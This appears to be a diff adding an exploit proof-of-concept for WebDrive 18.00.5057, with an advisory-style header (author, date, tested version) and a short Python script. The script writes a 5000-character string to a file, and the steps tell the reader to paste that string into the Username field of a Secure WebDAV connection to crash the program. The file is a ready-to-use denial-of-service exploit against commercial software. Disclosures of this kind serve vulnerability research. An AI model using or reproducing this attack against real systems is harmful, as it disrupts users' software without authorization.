@@ -1,0 +1,25 @@
+#Exploit Title: WebDrive 18.00.5057 - Denial of Service (PoC)
+#Discovery by: Victor Mondragón
+#Discovery Date: 2018-10-31
+#Vendor Homepage: https://webdrive.com/
+#Software Link: https://webdrive.com/download/
+#Tested Version: 18.00.5057
+#Tested on: Windows 10 Single Language x64
+
+#Steps to produce the crash:
+#1.- Run python code: WebDrive_18.00.5057.py
+#2.- Open string.txt and copy content to clipboard
+#2.- Open WebDrive
+#3.- Select "New"
+#4.- Select "Secure WebDAV" and click on "Siguiente"
+#6.- Select "Url / Address" and Put "1.1.1.1" 
+#7.- Select "Username" and Paste ClipBoard
+#8.- Select "Password" and Put "1234"
+#9.- Click on "Test Connection"
+#10.- Crashed
+
+cod = "\x41" * 5000
+
+f = open('string.txt', 'w')
+f.write(cod)
+f.close()
